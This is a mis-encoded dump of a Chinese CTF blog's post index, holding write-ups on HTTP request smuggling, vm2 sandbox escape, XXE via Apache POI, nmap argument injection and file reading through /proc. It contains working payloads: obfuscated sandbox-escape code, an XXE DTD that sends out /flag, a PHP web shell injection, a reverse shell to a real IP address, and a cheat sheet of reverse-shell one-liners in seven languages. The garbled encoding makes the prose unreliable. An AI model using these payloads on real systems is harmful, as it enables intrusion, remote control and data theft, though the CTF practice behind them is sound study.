å‡è®¾åˆ°78å‰é¢æ­£å¥½ä¸º89ä¸ªå­—ç¬¦çš„è¯ï¼Œæ¯”å¦‚åƒè¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼Œå‰ç«¯è¯»å–ç¬¬ä¸€ä¸ªCLè®¤ä¸ºè¯·æ±‚ä½“åŒ…æ‹¬äº†12345\\r\\naï¼Œè€Œåç«¯è¯»å–ç¬¬äºŒä¸ªCLï¼Œè®¤ä¸ºè¯·æ±‚ä½“åªåŒ…æ‹¬åˆ°äº†12345\\r\\nã€‚äºæ˜¯åé¢çš„aå°±åˆ°äº†ç¼“å†²åŒºä¹‹ä¸­ï¼Œå½“åˆæœ‰ç”¨æˆ·è¿›è¡Œè¿™æ ·ä¸€ä¸ªè®¿é—®æ—¶ï¼š 123POST / HTTP/1.1Host: police.liki.linkContent-Length: 77 å°±ä¼šäº§ç”Ÿä¸å­˜åœ¨aPOSTè¿™ç§è®¿é—®æ–¹å¼çš„é”™è¯¯äº† åœ¨httpè¯·æ±‚ä¸­å­˜åœ¨CLå’ŒTE(Transfer-Encoding)ï¼Œå‰ç«¯åªå¤„ç†çš„æ˜¯CLï¼Œåç«¯åªå¤„ç†TEï¼ˆCL-TEï¼‰åœ¨Transfer-Encoding: chunkedä¸‹æ•°æ®æ ¼å¼æ˜¯è¿™æ ·çš„ 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size &#x3D; 0][\\r\\n][\\r\\n] åˆ†å—å¤§å°çš„å€¼åœ¨å‰ï¼Œåé¢æ˜¯åˆ†å—æ•°æ®ã€‚å½“åˆ°å°¾éƒ¨æ—¶ï¼Œåˆ†å—å¤§å°çš„å€¼ä¸º0ï¼Œç„¶åä»¥\\r\\n\\r\\nç»“æŸ åƒè¿™æ ·çš„ä¸€ä¸ªè¯·æ±‚ï¼Œå‰ç«¯å¤„ç†CLåè®¤ä¸ºè¯·æ±‚ä½“ä¸º6ï¼ŒåŒ…æ‹¬0\\r\\n\\r\\nGã€‚è€Œåç«¯å¤„ç†TEåï¼Œæ£€æµ‹åˆ°0\\r\\n\\r\\nå°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ï¼ŒGå°±è¿›å…¥äº†ç¼“å†²åŒºã€‚ç»“æœå°±æ˜¯å†å‘é€ä¸€ä¸ªæ­£å¸¸çš„POSTè¯·æ±‚è¿›æ¥ï¼Œå°±ä¼šå‡ºç°æ²¡æœ‰GPOSTè¯·æ±‚çš„é”™è¯¯ å‰ç«¯åªå¤„ç†TEï¼Œåç«¯åªå¤„ç†CLï¼ˆTE-CLï¼‰ åƒè¿™ä¸ªè¯·æ±‚ï¼Œå‰ç«¯æ¥å—åæ£€æµ‹åˆ°0\\r\\n\\r\\nåæ‰è®¤ä¸ºè¯·æ±‚ç»“æŸï¼Œäºæ˜¯å°±æŠŠ12\\r\\nGPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\nè®¤ä¸ºæ˜¯å±äºè¯·æ±‚ä½“çš„ã€‚è€Œåç«¯æ ¹æ®CLå€¼ï¼Œè®¤ä¸º12\\r\\nè¯·æ±‚å°±ç»“æŸäº†ï¼Œäºæ˜¯è¿ç»­è®¿é—®åå°±ä¼šå‡ºç°æ²¡æœ‰GPOSTè¯·æ±‚çš„é”™è¯¯ å‰åç«¯éƒ½å¤„ç†TEè¿™æ—¶è™½ç„¶å¤„ç†ç›¸åŒäº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹TEè¿›è¡Œæ··æ·†ï¼Œä½¿å¾—å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†TEï¼Œç»“æœé€ æˆTE-CL/CL-TEçš„httpèµ°ç§ åƒè¿™ä¸ªè¯·æ±‚ï¼Œå°è¯•ç”¨ä¸¤ä¸ªTEå»æ··æ·†ï¼Œä½¿å¾—åç«¯æœåŠ¡å™¨ä¸å¤„ç†TEåªå¤„ç†CLï¼Œé€ æˆTE-CLçš„httpèµ°ç§ æ¥è‡ªåšå®¢ï¼šhttp://www.shifeng-kaze.cn/index.php/archives/132/#ï¼Œå†™çš„çœŸå¥½ï¼Œè¿™é‡Œåªåšè‡ªå·±çš„çºªå¿µ Hgameä¸¤é“é¢˜çš„Payloadï¼š ç¬¬ä¸€é¢˜ï¼š 1234567891011GET / HTTP/1.1Host: thief.0727.siteContent-Length: 77Transfer-Encoding: chunked0GET /secret HTTP/1.1Host: thief.0727.siteClient-IP:127.0.0.1aa:bn ç¬¬äºŒé¢˜ï¼š è¿™é¢˜ç›®å’Œç¬¬ä¸€é¢˜æ˜¯å·®ä¸å¤šä¸€æ ·çš„ï¼Œåªä¸è¿‡æ˜¯ä½œè€…ä¸ºäº†é˜²æ­¢è¹­è½¦è®¾ç½®äº†éšœç¢ï¼Œä½ å¾—çˆ†ç ´ 1234567891011121314151617GET / HTTP/1.1Host: police.liki.linkUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Length: 77Transfer-Encoding: chunked0GET /secret HTTP/1.1Host: thief.0727.siteClient-IP:127.0.0.1aa:bn (æœ€åä¸¤è¡Œçš„æ¢è¡Œç¬¦æ˜¯å¿…éœ€å“)","categories":[],"tags":[]},{"title":"De1CTF2019SSRFMe","slug":"De1CTF2019SSRFMe","date":"2021-01-12T03:32:47.000Z","updated":"2021-01-12T03:33:34.676Z","comments":true,"path":"2021/01/12/De1CTF2019SSRFMe/","link":"","permalink":"http://example.com/2021/01/12/De1CTF2019SSRFMe/","excerpt":"","text":"","categories":[],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"HFCTF2020JustEscape","slug":"HFCTF2020JustEscape","date":"2020-12-17T06:22:59.000Z","updated":"2020-12-17T09:27:45.152Z","comments":true,"path":"2020/12/17/HFCTF2020JustEscape/","link":"","permalink":"http://example.com/2020/12/17/HFCTF2020JustEscape/","excerpt":"","text":"ä¸€é“VM2çš„æ²™ç®±é€ƒé€¸.. çŸ¥è¯†ç‚¹ æ²™ç®±é€ƒé€¸ Payloadæ‹¼æ¥(?) åšé¢˜æ€è·¯è¿™é“é¢˜ç›®ä¼ªè£…æˆPHPæ˜¯çœŸæ»´æ¶å¿ƒï¼Œé¦–å…ˆæˆ‘ä»¬è®¿é—®å¯ä»¥å¾—åˆ°ä¸€ä¸ªç”¨Vueæ¡†æ¶å†™çš„é¡µé¢ï¼š å°è¯•ç›´æ¥è®¿é—®index.phpçš„è¯å¯ä»¥å¾—åˆ°ä¸€æ®µphpæºç : 12345678&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123; $code = $_GET[&#x27;code&#x27;]; echo eval(code);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; ç»“æœä½ å°±ä¼šå‘ç°è¿™ä¸ªcodeæ˜¯æ²¡åŠ $ç¬¦å·çš„ä¹Ÿå°±æ˜¯è¯´ä»–æ²¡ç”¨..é‚£ä¹ˆå†å›åˆ°ä¹‹å‰çš„codeçš„éƒ¨åˆ†ï¼Œå¤§æ¦‚ä¹Ÿæ˜¯çœŸçš„evaläº†è¿™æ®µä»£ç ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯Javascript 1?code=Error().stack æœç„¶æ˜¯JSï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯VM2çš„æ²™ç®±ï¼Œé‚£ä¹ˆå¦‚ä½•æ²™ç®±é€ƒé€¸å‘¢ï¼ŸğŸ‘´ä¸€ç‚¹JSä¹Ÿä¸æ‡‚ï¼Œæ²¡æ³•å­åªèƒ½å»GITHUBä¸Šå«–ï¼Œæ‰¾åˆ°ï¼š vm2æ²™ç®±é€ƒé€¸ï¼Œå¯ä»¥çœ‹åˆ°ï¼š 123456789101112131415&quot;use strict&quot;;const &#123;VM&#125; = require(&#x27;vm2&#x27;);const untrusted = &#x27;(&#x27; + function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;+&#x27;)()&#x27;;try&#123; console.log(new VM().run(untrusted));&#125;catch(x)&#123; console.log(x);&#125; å°è¯•å¤åˆ¶ç²˜è´´ã€ 12345678(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;() å¥½çš„æ‰“ä¸è¿‡ï¼Œå€’åœ°åªèƒ½çœ‹WPäº†ï¼Œåˆ«äººç»™å‡ºçš„POCï¼š POC 1123456789(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString(); &#125;&#125;)() å‘ƒ..?è¿™é‡Œçœ‹èµ·æ¥æ˜¯è¿›è¡Œäº†æ‹¼æ¥ï¼Œè‡ªå·±ä¸æ‡‚åŸç†çš„è¯å°±å…ˆå­¦ä¼šæ€ä¹ˆæ‹¼æ¥payloadå§,åœ¨JSä¸­æˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·æ¥ä»£æ›¿å•å¼•å·å’ŒåŒå¼•å·ï¼š `çš„è¯­æ³•ES6 æ¨¡æ¿å­—ç¬¦ä¸²(Template String)æ˜¯å¢å¼ºç‰ˆçš„å­—ç¬¦ä¸²ï¼Œç”¨åå¼•å·(`)æ ‡è¯†ï¼Œå®ƒå¯ä»¥å½“ä½œæ™®é€šå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¤šè¡Œå­—ç¬¦ä¸²ï¼Œæˆ–è€…åœ¨å­—ç¬¦ä¸²ä¸­åµŒå…¥å˜é‡ã€‚ä»‹ç»åšå®¢,ä»æ­¤å¤„æˆ‘ä»¬å¯ä»¥å¾—åˆ°åå¼•å·ä½œç”¨ï¼š ä»£æ›¿å­—ç¬¦ä¸²çš„åŒå¼•å·å’Œå•å¼•å· å¯ä»¥åŒ…å«ç‰¹å®šè¯­æ³•çš„å ä½ç¬¦ é…åˆ${}ç¬¦å·å¯ä»¥åŒ…å«å˜é‡ ä¾‹å­ï¼š åŸæœ¬æˆ‘ä»¬è¾“å‡ºå¤šè¡Œå­—ç¬¦ä¸²åº”è¯¥è¿™æ ·æ¥å†™ï¼š 12console.log(&#x27;string text line 1\\n&#x27; +&#x27;string text line 2&#x27;); ä½¿ç”¨åå¼•å·ä¹‹å: 12console.log(`string text line 1string text line 2`); å½“å…¶ä¸${}æ­é…ä¹‹åæ›´æ˜¯å¯ä»¥å¤§å¤§é™ä½æˆ‘ä»¬ä¹¦å†™å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–é—®é¢˜ï¼š é‚£ä¹ˆç°åœ¨å›åˆ°é¢˜ç›®æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‹¼æ¥å˜é‡è¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å…ˆç”¨åå¼•å·å°†éœ€è¦çš„ä¸œè¥¿åŒ…å«èµ·æ¥ï¼Œå†ç”¨${}å³å¯è¡¨ç¤ºä¸ºä¸€ä¸ªå˜é‡ï¼š []çš„è¯­æ³•å¦‚æœä¸å…è®¸æˆ‘ä»¬ä½¿ç”¨ç‚¹å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[]æ¥ç»•è¿‡ï¼šJSä¸­çš„ä¸­æ‹¬å· è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ä»»æ„çš„ç»•è¿‡å…³é”®å‚æ•°åŒ¹é…ï¼Œæ‹¼æ¥å‡ºä¸Šå›¾çš„Payloadäº† POC 2åˆ©ç”¨joinæ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼š JOIN12(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &#125; &#125;)() JSå½“ä¸­ä½¿ç”¨join()ä¸­æ·»åŠ å‚æ•°æ¥å†³å®šå¦‚ä½•æ‹¼æ¥ï¼Œå¦‚æœä¸æ·»åŠ é»˜è®¤ç”¨,åˆ†å‰²å¼€æ¥ï¼Œå¦‚æœä¸º0å°±ä¼šæ‹¼æ¥åœ¨ä¸€èµ·äº† POC 3æ•°ç»„ç»•è¿‡1234567code[]=(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString(); &#125; VM2æ²™ç®±é€ƒé€¸åŸç†å…ˆä¸¢åœ¨è¿™ï¼Œä¸æ•¢ç¢°æˆ‘npmç¯å¢ƒç°åœ¨","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Javascirpt","slug":"Javascirpt","permalink":"http://example.com/tags/Javascirpt/"},{"name":"vm2æ²™ç®±é€ƒé€¸","slug":"vm2æ²™ç®±é€ƒé€¸","permalink":"http://example.com/tags/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"}]},{"title":"ç½‘é¼æ¯fileJava","slug":"ç½‘é¼æ¯fileJava","date":"2020-12-17T02:16:24.000Z","updated":"2020-12-17T05:12:48.845Z","comments":true,"path":"2020/12/17/ç½‘é¼æ¯fileJava/","link":"","permalink":"http://example.com/2020/12/17/%E7%BD%91%E9%BC%8E%E6%9D%AFfileJava/","excerpt":"","text":"çŸ¥è¯†ç‚¹ Java æ–‡ä»¶æ³„éœ² XXE åšé¢˜æ€è·¯ï¼š å¼€å±€å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸‹è½½çš„æ—¶å€™å¯ä»¥æ–‡ä»¶æ³„éœ² è¿™æ ·çš„è¯å°±å¯ä»¥æ‰¾åˆ°ä¸‰ä¸ªJavaæ–‡ä»¶ï¼Œåˆ†åˆ«dumpæºç ï¼Œåœ¨æ–‡ä»¶ä¸­ä½œè€…ç»™å‡ºäº†æç¤º 123456789101112131415161718192021FileItem fileItem = (FileItem)var10.next();String filename;String fileExtName;if (fileItem.isFormField()) &#123; filename = fileItem.getFieldName(); fileExtName = fileItem.getString(&quot;UTF-8&quot;);&#125; else &#123; filename = fileItem.getName(); if (filename != null &amp;&amp; !filename.trim().equals(&quot;&quot;)) &#123; fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1); InputStream in = fileItem.getInputStream(); if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) &#123; try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch (InvalidFormatException var20) &#123; System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;); var20.printStackTrace(); &#125; &#125; æ•…æ‰¾åˆ°è¿™ä¸ªCVEï¼š https://blog.csdn.net/weixin_42296449/article/details/88934150 å…ˆå†™ä¸€ä¸ªç¬¦åˆæ­£åˆ™çš„çš„ç”¨æˆ·åevcel-xxx.xlsx,å°†å…¶åç¼€ä¿®æ”¹ä¸ºzipï¼ŒåŠ ä¸ŠPOCä¹‹åå†ä¿®æ”¹å›å»ï¼š 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://0.0.0.0/1.dtd&quot;&gt;%remote;%int;%send;]&gt; åœ¨åå°„è¿‡å»çš„æœºå­ä¸Šé¢å†™ä¸€ä¸ª1.dtdï¼Œä»¤å…¶è¿œç¨‹å®ä½“è°ƒç”¨ 12&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;0.0.0.0?p=%file;&#x27;&gt;&quot;&gt; éšåä¸Šä¼ æ–‡ä»¶å³å¯ï¼š","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"XXE","slug":"XXE","permalink":"http://example.com/tags/XXE/"}]},{"title":"ç½‘é¼æ¯æœ±é›€ç»„Nmap","slug":"ç½‘é¼æ¯æœ±é›€ç»„Nmap","date":"2020-12-16T09:06:30.000Z","updated":"2020-12-16T09:15:18.257Z","comments":true,"path":"2020/12/16/ç½‘é¼æ¯æœ±é›€ç»„Nmap/","link":"","permalink":"http://example.com/2020/12/16/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84Nmap/","excerpt":"","text":"è€ƒç‚¹ï¼š NMAP ç»„ä»¶ PHP çŸ­æ ‡ç­¾ç»•è¿‡ åšé¢˜æ€è·¯é¢˜ç›®ç±»ä¼¼BUUæ›¾ç»çš„é¢˜ç›®Online Tool æ­¤å¤„ä½¿ç”¨systemå‡½æ•°ï¼Œåº”è¯¥å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œnmapå‚æ•°ä¸­ -oGå¯ä»¥è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Œæ­¤å¤„æˆ‘ä»¬å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæœ€åpayloadä¸º 1?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27; ç›´æ¥å†™å…¥PHPè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç»•è¿‡ä¸€ä¸‹å°±è¡Œ 1host&#x3D; &#39; &lt;?&#x3D;&#96;$_POST[0]&#96; ;?&gt; -oG 1.phtml &#39;","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"PicDown","slug":"PicDown","date":"2020-12-16T07:44:20.000Z","updated":"2021-05-02T02:45:17.672Z","comments":true,"path":"2020/12/16/PicDown/","link":"","permalink":"http://example.com/2020/12/16/PicDown/","excerpt":"","text":"çŸ¥è¯†ç‚¹ æ–‡ä»¶åŒ…å« linuxä¿¡æ¯æ–‡ä»¶è¯»å– åšé¢˜æ€è·¯å¼€å±€å°±å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„åœ°æ–¹ï¼Œåˆ©ç”¨burpå°±å¯ä»¥æŠ“å–æ•°æ® ä¹‹åä½ å¯ä»¥ç›´æ¥è¯»å–åˆ°flagäº†[ æˆ‘æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªï¼Œè¿™é“é¢˜åº”è¯¥æ²¡é‚£ä¹ˆç®€å•ï¼Œçœ‹äº†åˆ«äººçš„WPæ‰çŸ¥é“åº”è¯¥è¯»å–linuxprocä¸‹çš„æ–‡ä»¶ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹ï¼š 1234567891011121314/proc/[pid]/cmdline #æŸ¥çœ‹å½“å‰linuxæ­£åœ¨æ‰§è¡Œä»€ä¹ˆå‘½ä»¤ï¼Œåœ¨è¿™é‡Œpidä¸çŸ¥é“çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡selfä»£æŒ‡å½“å‰webç«¯çš„æ–‡ä»¶/proc/self/comm #æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å‘½ä»¤å/proc/self/cwd #æŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•çš„ç¬¦å·è¿æ¥cwdä¸‹é¢ä¼šæœ‰å¯ä»¥è¯»å–çš„æ–‡ä»¶ï¼Œæ¯”å¦‚/var/www/html ä¸‹æˆ‘åœ¨å·¥ä½œï¼Œé‚£ä¹ˆ/proc/self/cwd/index.php åŒæ ·å¯ä»¥è¯»å–åˆ°/proc/self/environ #æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡/proc/self/exe #æŸ¥çœ‹å®é™…è¿è¡Œç¨‹åºçš„ç¬¦å·é“¾æ¥/proc/self/fd #ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼ˆæ³¨æ„è¿™é‡Œæ›¾ç»å‡ºè¿‡è€ƒç‚¹ï¼Œå¦‚æœçœ‹åˆ°ä¸€ä¸ªç¨‹åºPythonæ‰“å¼€æŸä¸ªtxtä¹‹åæ²¡æœ‰å…³é—­ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™é‡Œæ¥è¯»å– æ—¢ç„¶æ˜¯flaskæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–app.pyï¼Œè·å–æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦å»æ‹¿åˆ°keyï¼Œç›´æ¥è¯»å–/tmp/secret.txtä¼šè¯»å–ä¸åˆ°ï¼Œå› ä¸ºå·²ç»è¢«åˆ æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥å»å°è¯•è¯»å–/proc/self/fd/3ï¼Œç»“æœè¿˜æ˜¯å‡ºä¸æ¥ï¼Œè¿™ä¸‹å°±åªèƒ½çˆ†ç ´äº†ã€‚ã€‚ã€‚çœ‹çœ‹å›æ˜¾é•¿åº¦æ˜æ˜¾ä¸å¯¹çš„ 1234567import requests,timefor i in range(1,10000): url = &quot;http://ab2b25bc-4b91-4cdd-8783-c166e7d6ebae.node3.buuoj.cn/page?url=../../../../../../proc/&#123;&#125;/fd/3&quot;.format(i) res = requests.get(url=url).text print(len(res),&quot;æ­¤æ—¶iä¸º&quot;+str(i)) time.sleep(0.05) è¿™é‡Œæˆ‘å¾—è¿›ç¨‹æ˜¯14ï¼Œçˆ†ç ´å¾—åˆ° 1yoKTwnWJilxVJnoa8y9HwwAAagZ7aKs0MGPKhMbjYWA= æ—¢ç„¶åªèƒ½æ‰§è¡Œos.system,ç›´æ¥åå¼¹shell 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27; å¼¹è¿‡å»å°±æ‹¿åˆ°shelläº† è¿™é‡Œé¡ºä¾¿æŠŠå„ç§è¯­è¨€ä¸€å¥è¯åå¼¹shellè®°å½•åœ¨æ­¤ï¼š python: 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27; perl: 1 1perl -e &#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; 2 1perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27; Ruby 1ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; PHP 1php -r &#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; 12345678910111213 public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125; Lua 1lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;5555&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot; AWK 1awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27; [WMCTF2020]Make PHP Great Againç»•è¿‡require_once åªèƒ½åŒ…å«ä¸€æ¬¡çš„çš„é™åˆ¶ ä»Šå¤©å°±æ¥è°ˆè°ˆï¼Œæ€ä¹ˆè®¾æƒ³å¦‚ä½•ç»•è¿‡è¿™ä¸ªå“ˆå¸Œè¡¨ï¼Œè®©phpè®¤ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œåˆå¯ä»¥è®©phpèƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œè¯»å–åˆ°å†…å®¹ã€‚ åœ¨è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œ/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ï¼Œ/proc/self/root/æ˜¯æŒ‡å‘/çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ï¼Œpayload: 